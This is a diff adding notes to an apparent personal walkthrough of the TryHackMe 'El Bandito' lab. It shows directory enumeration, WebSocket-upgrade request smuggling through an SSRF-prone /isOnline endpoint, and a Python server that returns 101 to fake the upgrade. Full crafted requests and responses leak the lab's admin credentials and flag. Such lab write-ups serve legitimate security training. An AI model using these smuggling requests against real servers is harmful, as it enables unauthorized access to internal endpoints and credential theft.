@@ -1,6 +1,8 @@
 <code>
 
 https://tryhackme.com/r/room/elbandito
+https://0xb0b.gitbook.io/writeups/tryhackme/2024/el-bandito
+https://voltatech.in/blog/2024/tryhackme-elbandito/#weaponizing-the-smuggled-request
 
 ## Enumeration
 
@@ -19,20 +21,7 @@ PORT     STATE SERVICE
 
 ┌──(kali㉿kali)-[~]
 └─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://elbandito.thm:8080 
-===============================================================
-Gobuster v3.6
-by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
-===============================================================
-[+] Url:                     http://elbandito.thm:8080
-[+] Method:                  GET
-[+] Threads:                 10
-[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-[+] Negative Status codes:   404
-[+] User Agent:              gobuster/3.6
-[+] Timeout:                 10s
-===============================================================
-Starting gobuster in directory enumeration mode
-===============================================================
+
 /info                 (Status: 200) [Size: 2]
 /admin                (Status: 403) [Size: 146]
 /health               (Status: 200) [Size: 150]
@@ -126,9 +115,166 @@ Starting gobuster in directory enumeration mode
 /trace3d_2            (Status: 403) [Size: 146]
 /trace3d_1            (Status: 403) [Size: 146]
 Progress: 220560 / 220561 (100.00%)
-===============================================================
-Finished
-===============================================================
+
+## In BuprSuit
+
+Possible Request **Smuggleing Via WebSocket**
+
+We intercept the request on burn.html and see an HTTP/1.1 WebSocket request in Burp Suite. 
+
+GET / HTTP/1.1
+Host: elbandito.thm:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Sec-WebSocket-Version: 777
+Origin: http://elbandito.thm:8080
+Sec-WebSocket-Key: i4lFrphlN+besuhPrKrkPQ==
+Connection: keep-alive, Upgrade
+Pragma: no-cache
+Cache-Control: no-cache
+Upgrade: websocket
+
+GET /env HTTP/1.1
+Host: elbandito.thm
+
+run own web server 
+
+┌──(kali㉿kali)-[~/Documents/python]
+└─$ cat server.py 
+## Setting up the Attacker's Web Server
+## We can quickly set up a web server that responds with status 101 to every request with the following Python code:
+import sys
+from http.server import HTTPServer, BaseHTTPRequestHandler
+
+if len(sys.argv)-1 != 1:
+    print("""
+Usage: {} 
+    """.format(sys.argv[0]))
+    sys.exit()
+
+class Redirect(BaseHTTPRequestHandler):
+   def do_GET(self):
+       self.protocol_version = "HTTP/1.1"
+       self.send_response(101)
+       self.end_headers()
+
+HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()
+                                                                                                                    
+┌──(kali㉿kali)-[~/Documents/python]
+└─$ python server.py 5555
+10.10.15.215 - - [05/Feb/2025 12:49:05] "GET / HTTP/1.1" 101 -
+
+
+
+
+GET /isOnline?url=http://10.8.28.108:5555/ HTTP/1.1
+Host: elbandito.thm:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Sec-WebSocket-Version: 777
+Origin: http://elbandito.thm:8080
+Sec-WebSocket-Key: i4lFrphlN+besuhPrKrkPQ==
+Connection: keep-alive, Upgrade
+Pragma: no-cache
+Cache-Control: no-cache
+Upgrade: websocket
+
+GET /env HTTP/1.1
+Host: elbandito.thm
+
+
+
+GET /isOnline?url=http://10.8.28.108:5555/ HTTP/1.1
+Host: elbandito.thm:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Sec-WebSocket-Version: 777
+Origin: http://elbandito.thm:8080
+Sec-WebSocket-Key: i4lFrphlN+besuhPrKrkPQ==
+Connection: keep-alive, Upgrade
+Pragma: no-cache
+Cache-Control: no-cache
+Upgrade: websocket
+
+GET /trace HTTP/1.1
+Host: elbandito.thm:8080
+
+**SEND**
+GET /isOnline?url=http://10.8.28.108:5555/ HTTP/1.1
+Host: elbandito.thm:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Sec-WebSocket-Version: 777
+Origin: http://elbandito.thm:8080
+Sec-WebSocket-Key: i4lFrphlN+besuhPrKrkPQ==
+Connection: keep-alive, Upgrade
+Pragma: no-cache
+Cache-Control: no-cache
+Upgrade: websocket
+
+GET /admin-creds HTTP/1.1
+Host: elbandito.thm:8080
+
+
+**GET**
+HTTP/1.1 101 
+Server: nginx
+Date: Wed, 05 Feb 2025 10:48:17 GMT
+Connection: upgrade
+X-Application-Context: application:8081
+
+HTTP/1.1 200 
+X-Application-Context: application:8081
+Content-Type: text/plain
+Content-Length: 55
+Date: Wed, 05 Feb 2025 10:48:17 GMT
+
+username:hAckLIEN password:YouCanCatchUsInYourDreams404
+
+GET /isOnline?url=http://10.8.28.108:5555/ HTTP/1.1
+Host: elbandito.thm:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Sec-WebSocket-Version: 777
+Origin: http://elbandito.thm:8080
+Sec-WebSocket-Key: i4lFrphlN+besuhPrKrkPQ==
+Connection: keep-alive, Upgrade
+Pragma: no-cache
+Cache-Control: no-cache
+Upgrade: websocket
+
+GET /admin-flag HTTP/1.1
+Host: elbandito.thm:8080
+
+**GET**
+HTTP/1.1 101 
+Server: nginx
+Date: Wed, 05 Feb 2025 10:51:43 GMT
+Connection: upgrade
+X-Application-Context: application:8081
+
+HTTP/1.1 200 
+X-Application-Context: application:8081
+Content-Type: text/plain
+Content-Length: 43
+Date: Wed, 05 Feb 2025 10:51:43 GMT
+
+THM{:::MY_DECLINATION:+62°_14\'_31.4'':::}
+
+
+view-source:https://elbandito.thm:80/static/messages.js
+
+
                                                                      
 
 </code>
